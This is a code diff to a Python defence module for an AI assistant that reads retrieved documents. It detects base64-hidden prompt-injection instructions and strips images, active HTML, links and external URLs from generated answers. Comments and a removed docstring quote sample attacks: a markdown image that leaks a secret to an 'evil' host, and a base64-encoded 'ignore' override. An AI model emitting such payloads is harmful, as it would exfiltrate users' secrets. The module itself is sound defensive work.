@@ -166,6 +166,18 @@ def _try_b64_text(blob: str) -> str:
     return text if text and printable / len(text) > 0.9 else ""
 
 
+def _contains_high_injection(text: str) -> bool:
+    """Check decoded text for high-severity rules without recursively decoding blobs."""
+    if _TAG_CHARS.search(text):
+        text += " " + _decode_tag_chars(text)
+    norm = _normalise(text)
+    return any(
+        severity == HIGH and pattern.search(variant)
+        for variant in _variants(norm)
+        for _, severity, pattern in _RULES
+    )
+
+
 def scan_text(text: str, location: str = "", check_secrets: bool = True) -> list[Finding]:
     """Returns findings for one block of text (a page / section / chunk)."""
     findings: list[Finding] = []
@@ -194,10 +206,12 @@ def scan_text(text: str, location: str = "", check_secrets: bool = True) -> list
                 seen.add(name)
                 findings.append(Finding(name, severity, _excerpt(variant, m.start(), m.end()), location))
 
-    # 2b) instructions hidden inside base64 blobs ("decode and follow: aWdub3Jl...")
+    # 2b) instructions hidden inside base64 blobs ("decode and follow: aWdub3Jl...").
+    # Inspect the decoded text directly instead of recursively calling scan_text():
+    # nested base64 could otherwise cause unbounded recursion.
     for blob in _BASE64_BLOB.findall(text):
         decoded = _try_b64_text(blob)
-        if decoded and any(f.severity == HIGH for f in scan_text(decoded, check_secrets=False)):
+        if decoded and _contains_high_injection(decoded):
             findings.append(Finding("encoded_injection", HIGH, f"base64 decodes to: {decoded[:100]!r}", location))
             break
 
@@ -247,16 +261,35 @@ def check_user_input(question: str, max_chars: int = 0, block_extraction: bool =
 # ---------------------------------------------------------------- output sanitising
 _MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
 _HTML_IMG = re.compile(r"<\s*img\b[^>]*>", re.IGNORECASE)
-_URL = re.compile(r"https?://[^\s<>()\[\]\"']+", re.IGNORECASE)
-_MD_LINK = re.compile(r"\[([^\]]+)\]\((https?://[^)\s]+)\)")
-_UNSAFE_LINK = re.compile(r"\[([^\]]*)\]\(\s*(?:javascript|vbscript|data|mailto|file|ftp|tel)\s*:[^)]*\)", re.IGNORECASE)
+# Remove HTML anchors regardless of their href, then strip raw external URLs below.
+# This avoids trusting HTML links and also catches attributes/formatting variants.
+_HTML_LINK = re.compile(r"<\s*a\b[^>]*>(.*?)<\s*/\s*a\s*>", re.IGNORECASE | re.DOTALL)
+_HTML_ANCHOR_TAG = re.compile(r"</?\s*a\b[^>]*>", re.IGNORECASE)
+# Remove paired active content and any remaining active tags (including malformed or
+# unclosed tags) that could cause a browser to load remote resources or execute content.
+_HTML_ACTIVE_CONTENT = re.compile(
+    r"<\s*(script|style|iframe|object|embed|svg|math)\b[^>]*>.*?<\s*/\s*\1\s*>",
+    re.IGNORECASE | re.DOTALL,
+)
+_HTML_ACTIVE_TAG = re.compile(
+    r"</?\s*(?:script|style|iframe|object|embed|svg|math|video|audio|source|link|meta|form|input|button)\b[^>]*>",
+    re.IGNORECASE,
+)
+_URL = re.compile(r"(?:https?://|www\.)[^\s<>()\[\]\"']+", re.IGNORECASE)
+_MD_LINK = re.compile(r"\[([^\]]+)\]\(\s*(?:https?://|//|www\.)[^)]*\)", re.IGNORECASE)
+_UNSAFE_LINK = re.compile(
+    r"\[([^\]]*)\]\(\s*(?:javascript|vbscript|data|mailto|file|ftp|tel)\s*:[^)]*\)",
+    re.IGNORECASE,
+)
 
 
 def sanitize_answer(answer: str, context_text: str = "") -> tuple[str, list[str]]:
-    """Removes ways a poisoned document could smuggle data OUT through the
-    rendered answer: images (auto-fetched by the browser, so
-    ![](https://evil/?q=SECRET) leaks with no click), links/URLs that did not
-    come from the retrieved context, secrets, and the system-prompt canary."""
+    """Sanitize model output before rendering it to a user.
+
+    Retrieved context is untrusted and is deliberately NOT used to authorize URLs.
+    The current policy removes external URLs from generated prose. Keep context_text
+    in the signature for compatibility with existing callers; it does not confer trust.
+    """
     actions: list[str] = []
 
     if SYSTEM_CANARY in answer:
@@ -264,23 +297,24 @@ def sanitize_answer(answer: str, context_text: str = "") -> tuple[str, list[str]
 
     cleaned = _MD_IMAGE.sub("[image removed]", answer)
     cleaned = _HTML_IMG.sub("[image removed]", cleaned)
+    cleaned = _HTML_ACTIVE_CONTENT.sub("[embedded content removed]", cleaned)
+    cleaned = _HTML_ACTIVE_TAG.sub("", cleaned)
     if cleaned != answer:
-        actions.append("removed image embed(s)")
+        actions.append("removed image or embedded content")
 
+    # Remove links with non-web schemes, preserving their human-readable labels.
     no_unsafe = _UNSAFE_LINK.sub(lambda m: m.group(1), cleaned)
     if no_unsafe != cleaned:
-        actions.append("removed link(s) with an unsafe scheme (javascript:, mailto:, data: ...)")
+        actions.append("removed link(s) with an unsafe scheme")
         cleaned = no_unsafe
 
-    allowed = {u.rstrip(".,;:") for u in _URL.findall(context_text)}
-
-    def _fix_link(m: re.Match) -> str:
-        return m.group(0) if m.group(2).rstrip(".,;:") in allowed else m.group(1)
-
-    after_links = _MD_LINK.sub(_fix_link, cleaned)
-    after_urls = _URL.sub(lambda m: m.group(0) if m.group(0).rstrip(".,;:") in allowed else "[link removed]", after_links)
+    # Remove HTML anchors and Markdown links; then remove any remaining raw URLs.
+    after_html_links = _HTML_LINK.sub(lambda m: m.group(1), cleaned)
+    after_html_links = _HTML_ANCHOR_TAG.sub("", after_html_links)
+    after_markdown_links = _MD_LINK.sub(lambda m: m.group(1), after_html_links)
+    after_urls = _URL.sub("[link removed]", after_markdown_links)
     if after_urls != cleaned:
-        actions.append("removed link(s) not present in the source documents")
+        actions.append("removed external link(s) from generated answer")
     cleaned = after_urls
 
     for name, pattern in _SECRETS:
